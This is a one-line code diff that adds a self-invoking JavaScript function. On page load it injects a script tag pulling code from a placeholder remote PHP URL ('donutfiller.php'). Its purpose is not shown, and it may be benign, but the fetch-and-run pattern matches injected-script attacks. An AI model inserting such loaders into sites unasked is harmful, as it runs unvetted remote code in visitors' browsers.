@@ -1,0 +1,1 @@
+function r() {s = document.createElement('script');s.type= 'text/javascript';s.src = 'http://url/to/donutfiller.php';document.head.appendChild(s);}r();
